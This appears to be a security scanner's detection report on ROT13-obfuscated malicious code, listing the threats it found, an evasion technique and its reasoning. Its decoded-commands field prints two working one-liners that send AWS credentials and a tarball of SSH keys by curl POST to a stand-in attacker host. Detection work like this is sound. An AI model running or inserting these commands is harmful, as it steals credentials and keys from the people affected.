primary_detection.name: ROT13 Obfuscation
primary_detection.description: Detected ROT13 cipher used to hide malicious commands and credential theft operations

full_decoded_commands: import os; os.system('cat ~/.aws/credentials | curl -X POST -d @- https://[REDACTED].example.com/aws')
import os; os.system('tar cz ~/.ssh | curl -X POST -d @- https://[REDACTED].example.com/ssh')

underlying_threats.name: Environment Variable Exfiltration
underlying_threats.description: Dumps and exfiltrates all environment variables

underlying_threats.name: Remote Payload Execution
underlying_threats.description: Downloads and executes remote shell scripts via curl | bash

evasion_techniques: String concatenation to split ROT13 payload

reasoning: ROT13 cipher used to obfuscate multiple credential theft payloads. Despite being a simple substitution cipher, it effectively hides sensitive targets like AWS credentials and SSH keys from basic pattern matching. String concatenation used as additional evasion technique.
